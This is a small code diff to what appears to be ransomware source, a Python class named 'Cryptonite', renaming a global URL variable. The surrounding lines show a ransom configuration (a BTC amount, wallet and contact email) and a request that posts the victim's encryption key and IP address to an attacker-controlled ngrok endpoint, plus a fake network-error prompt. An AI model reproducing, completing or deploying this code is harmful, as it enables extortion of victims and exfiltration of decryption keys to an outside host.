@@ -20,7 +20,7 @@ print(dkrpt)
 
 # some GLOBALS
 
-url = "YOUR_NGROK_URL_HERE"                             # <----  REQUIRED
+URL = "YOUR_NGROK_URL_HERE"                             # <----  REQUIRED
 BTC_AMOUNT = 0.03                                       # <----  REQUIRED
 BTC_WALLET = "YOUR_BTC_WALLET_HERE"                     # <----  REQUIRED
 EMAIL = "YOUR_EMAIL_HERE"                               # <----  REQUIRED
@@ -59,7 +59,7 @@ class Cryptonite():
                 "key": key,
                 "ip": ip
             }
-            r.post(url, data=json.dumps(jsonFormat))
+            r.post(URL, data=json.dumps(jsonFormat))
         except:
             pmb.confirm("Please make sure that you are connected to the internet and try again.", "Network Error")
             exit()
